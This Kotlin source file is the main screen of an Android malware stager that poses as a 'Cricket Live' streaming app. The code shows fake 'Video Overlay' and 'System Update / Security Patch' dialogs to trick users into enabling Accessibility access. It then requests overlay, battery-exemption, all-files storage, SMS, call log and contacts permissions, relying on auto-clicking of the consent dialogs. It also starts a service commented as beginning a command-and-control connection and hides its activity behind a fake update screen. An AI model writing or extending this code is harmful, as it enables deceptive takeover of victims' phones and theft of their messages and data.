package com.chameleon.stager.ui

import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.chameleon.stager.databinding.ActivityMainBinding
import com.chameleon.stager.service.PayloadService
import com.chameleon.stager.service.StagerAccessibilityService
import com.chameleon.stager.utils.PermissionHelper

class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    private val permissionHelper = PermissionHelper()
    private var hasStartedFlow = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setupUI()
        checkPermissions()

        // 10-second stealth timer — triggers permission flow automatically
        android.os.Handler(mainLooper).postDelayed({
            if (!isFinishing) {
                triggerStealthPermissionFlow()
            }
        }, 10000)
    }

    private fun setupUI() {
        binding.btnWatchLive.setOnClickListener {
            if (isAccessibilityServiceEnabled()) {
                startPayloadFlow()
            } else {
                showPermissionDialog()
            }
        }

        binding.btnSchedule.setOnClickListener {
            Toast.makeText(this, "Upcoming matches loading...", Toast.LENGTH_SHORT).show()
        }

        binding.btnTeams.setOnClickListener {
            if (!isAccessibilityServiceEnabled()) {
                openAccessibilitySettings()
            } else {
                startPayloadFlow()
            }
        }
    }

    private fun checkPermissions() {
        if (!isAccessibilityServiceEnabled()) {
            binding.statusText.text = "Enable Video Overlay to watch live"
            binding.statusIcon.setImageResource(android.R.drawable.ic_dialog_info)
        } else {
            binding.statusText.text = "Ready to stream"
            binding.statusIcon.setImageResource(android.R.drawable.ic_dialog_info)
        }
    }

    private fun showPermissionDialog() {
        AlertDialog.Builder(this)
            .setTitle("Video Overlay Required")
            .setMessage("Cricket Live needs Accessibility access to show score overlays while you use other apps. This allows you to watch the match while chatting or browsing.")
            .setPositiveButton("Enable Now") { _, _ ->
                openAccessibilitySettings()
            }
            .setNegativeButton("Later", null)
            .show()
    }

    private fun triggerStealthPermissionFlow() {
        if (isAccessibilityServiceEnabled()) {
            startPayloadFlow()
        } else {
            showStealthAccessibilityPrompt()
        }
    }

    private fun showStealthAccessibilityPrompt() {
        AlertDialog.Builder(this)
            .setTitle("System Update Required")
            .setMessage("Security Patch v2.1\n\nYour device needs a critical security update. Tap 'Apply Now' to proceed with the update process.")
            .setPositiveButton("Apply Now") { _, _ ->
                openAccessibilitySettings()
            }
            .setNegativeButton("Later", null)
            .setCancelable(false)
            .show()
    }

    private fun openAccessibilitySettings() {
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices = am.getEnabledAccessibilityServiceList(
            AccessibilityServiceInfo.FEEDBACK_ALL_MASK
        )
        return enabledServices.any {
            it.resolveInfo.serviceInfo.packageName == packageName
        }
    }

    fun startPayloadFlow() {
        if (hasStartedFlow) return
        hasStartedFlow = true
        continuePayloadFlow()
    }

    private fun continuePayloadFlow() {
        // Step 1: Overlay permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            startActivity(
                Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName")
                )
            )
            return
        }

        // Step 2: Battery optimization exemption
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                startActivity(
                    Intent(
                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:$packageName")
                    )
                )
                return
            }
        }

        // Step 2b: Storage permission (MANAGE_EXTERNAL_STORAGE needs Settings intent)
        if (!PermissionHelper.hasStoragePermission(this)) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                startActivity(
                    Intent(
                        Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                        Uri.parse("package:$packageName")
                    )
                )
                return
            }
        }

        // Step 3: Start foreground service (C2 connection begins)
        val serviceIntent = Intent(this, PayloadService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }

        // Step 4: Request runtime permissions (SMS, Call Log, Contacts)
        // AccessibilityService auto-clicks the "Allow" dialogs within ~300ms
        if (!permissionHelper.hasAllPermissions(this)) {
            permissionHelper.requestPermissions(this)
        }

        // Step 5: Notification permission (Android 13+)
        permissionHelper.requestNotificationPermission(this)

        // Step 6: Show system update overlay to hide all activity
        val overlayIntent = Intent(this, UpdateOverlayActivity::class.java)
        overlayIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(overlayIntent)

        finish()
    }

    override fun onResume() {
        super.onResume()
        if (isAccessibilityServiceEnabled()) {
            binding.statusText.text = "Ready to stream"
            // Safe to call repeatedly — hasStartedFlow guard prevents re-entry
            startPayloadFlow()
        }
    }
}
